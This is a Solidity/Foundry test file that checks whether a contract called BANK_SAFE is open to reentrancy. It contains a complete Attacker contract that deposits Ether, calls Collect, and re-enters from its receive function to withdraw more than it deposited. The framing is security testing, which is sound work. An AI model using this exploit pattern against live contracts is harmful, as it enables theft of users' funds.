
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {BANK_SAFE} from "../src/BANK_SAFE.sol";

contract TestReentrancyBANK_SAFE is Test {
    BANK_SAFE public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new BANK_SAFE();

        _attacker = new Attacker(address(_contractUnderTest));

        // Initialize BANK_SAFE: set MinSum and Log, then finalize initialization
        _contractUnderTest.SetMinSum(1 wei);
        _contractUnderTest.SetLogFile(address(new LogFileMock()));
        _contractUnderTest.Initialized();
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0);
        vm.assume(attackVal < type(uint128).max / 4);

        // Fund victim, attacker, and this contract
        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        // Execute attack
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(
            _attacker.exploitSucceeded(),
            "Reentrancy attack failed: exploitSucceeded flag was not set."
        );
    }

    receive() external payable {}
}

contract Attacker {
    BANK_SAFE public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = BANK_SAFE(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;

        // Deposit into BANK_SAFE so that balances[msg.sender] >= MinSum and >= val
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        // Trigger vulnerable Collect which will call back into this contract
        victim.Collect(val);

        // After reentrancy, check if we drained more Ether than our initial balance
        if (address(this).balance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            // Re-enter before victim updates balances[msg.sender]
            victim.Collect(storedAttackVal);
        }
    }
}

contract LogFileMock {
    function AddMessage(address, uint256, string memory) external {}
}
